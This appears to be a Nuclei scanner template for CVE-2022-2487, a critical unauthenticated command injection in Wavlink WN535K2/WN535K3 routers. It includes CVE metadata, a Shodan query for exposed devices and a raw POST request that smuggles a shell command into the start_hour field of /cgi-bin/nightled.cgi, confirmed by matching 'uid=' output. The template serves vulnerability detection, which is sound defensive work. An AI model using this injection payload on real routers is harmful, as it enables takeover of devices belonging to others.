id: CVE-2022-2487
info:
  name: Wavlink WN535K2/WN535K3 - OS Command Injection
  author: For3stCo1d
  severity: critical
  description: The Wavlink WN535K2 and WN535K3 routers are vulnerable to OS command
    injection through a manipulated start_hour argument in /cgi-bin/nightled.cgi,
    allowing attackers to execute malware, obtain sensitive information, modify data,
    and gain full control without proper credentials.
  reference:
  - https://github.com/1angx/webray.com.cn/blob/main/Wavlink/Wavlink%20nightled.cgi%20.md
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2487
  - https://vuldb.com/?id.204538
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2487
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-2487
    cwe-id: CWE-78
  metadata:
    shodan-query: http.title:"Wi-Fi APP Login"
    verified: 'true'
    impact: The OS command injection vulnerability in Wavlink WN535K2 and WN535K3
      routers can have a significant impact on the compromised system, enabling attackers
      to execute malware, obtain sensitive information, modify data, and gain full
      control without authentication.
    recommendation: I recommend updating the Wavlink WN535K2 and WN535K3 routers to
      the latest firmware version to address potential OS command injection vulnerabilities.
  tags: cve,cve2022,iot,wavlink,router,rce,oast
variables:
  cmd: id
requests:
- raw:
  - '@timeout: 10s

    POST /cgi-bin/nightled.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    page=night_led&start_hour=;{{cmd}};

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - uid=
    - gid=
    - nightStart
    condition: and
  - type: word
    words:
    - text/html
  - type: status
    status:
    - 200
